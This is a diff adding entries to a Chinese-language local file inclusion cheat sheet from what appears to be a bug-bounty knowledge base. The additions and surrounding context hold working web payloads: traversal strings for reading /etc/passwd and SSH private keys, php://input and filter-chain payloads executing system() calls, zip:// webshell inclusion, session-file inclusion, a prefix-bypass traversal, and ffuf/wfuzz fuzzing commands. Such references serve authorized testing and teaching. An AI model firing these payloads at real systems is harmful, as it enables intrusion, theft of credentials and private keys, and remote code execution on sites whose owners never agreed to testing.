@@ -69,6 +69,7 @@
 # Linux 系统/账户
 /etc/passwd   /etc/hosts   /etc/group   /etc/sudoers
 /root/.ssh/id_rsa   /home/{user}/.ssh/id_rsa   /root/.bash_history
+/root/.ssh/id_ed25519   /home/{user}/.ssh/id_ed25519   # 现代默认密钥名，id_rsa 常不存在（来源：公私钥）
 # 进程/环境（信息金矿）
 /proc/self/environ   /proc/self/cmdline   /proc/self/fd/{n}   /proc/version
 # Web 配置
@@ -130,7 +131,12 @@ GET ?file=php://input     POST body: <?php system('id'); ?>
 # zip:// / phar:// —— 归档内包含
 ?file=zip://uploads/shell.zip%23shell.txt&c=id    # %23 = #
 ?file=zip://uploads/image.jpg%23shell.txt&c=id    # 图片马（cat image.jpg shell.zip > image.jpg）
+# ssh2 / compress 系（文件、远程包含篇补充）
+?enil=ssh2.sftp://enil@enil.com/README.md         # SSH SFTP 协议包装
+?enil=compress.zlib://C:/phpStudy/PHPTutorial/WWW/file.bz2   # zlib 压缩流
 ```
+
+**Session 文件包含**（php://filter 读不出但 session 存在时；来源：文件、远程包含）：先找能把 payload 写进 `$_SESSION` 的参数（如 `?page=/var/lib/php/sessions/sess_<PHPSESSID>`），同一 PHPSESSID 再触发包含执行。
 
 **filter-chain → RCE（无上传、无日志、无可写文件）**：把 `iconv` 转换链进 `php://filter`，构造字节预置到资源前，直到拼出完整 `<?php ... ?>` 再被 `include()` 执行。用公开工具生成 `python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'`，输出长 `php://filter|convert.iconv.*|...|resource=php://temp` 串丢进 sink。payload 可达 10–50KB，长度受限就改 POST body 或最小化 payload `[Claude-BugHunter / Synacktiv 2022]`。
 
@@ -144,6 +150,7 @@ GET ?file=php://input     POST body: <?php system('id'); ?>
 | 仅允许某目录 | 规范化差异：`/allowed/../etc/passwd` |
 | 绝对路径拦 | 相对路径 + 多层 `../` |
 | 多 `../` 拦 | 嵌套：`....//` 删一次后剩 `../` |
+| 要求参数值必须以特定前缀开头（如 `language/`） | **前缀顺从**：把过滤要求的前缀放到 payload 开头一起提交——`language/../../etc/passwd`（非递归过滤下有效；来源：文件、远程包含） |
 
 其它变体：`/./` 冗余、`//` 双斜杠、`/;/` 分号路径段、`/admin;.jpg`（IIS/Tomcat 截断）、base64 路径（`?filename=<base64 of ../../windows/win.ini>`）`[本地 src-hunter]`。
 
@@ -169,6 +176,10 @@ done
 ffuf -u "https://target/page.php?file=FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
 ffuf -u "https://target/page.php?file=FUZZ" -w ~/wordlists/lfi.txt -mc all -fr "not found"
 dotdotpwn -m http -h target.com -o unix
+
+# 隐藏参数发现（wfuzz，--hh 按响应大小过滤空回显；来源：HTB-StreamIO 原文为带会话 Cookie 的 admin 页 FUZZ）
+wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "https://target/admin/?FUZZ=test" --hh <空回显字节数>
+# api-testing.md 已有 arjun 参数发现；本条为 wfuzz 变体，两者互补
 ```
 
 > 纪律：自动化只用于**扩大候选**，每条命中必须手工复现并保留证据；盲注用 Burp Collaborator 回调确认，不靠单次状态码/长度差下结论。
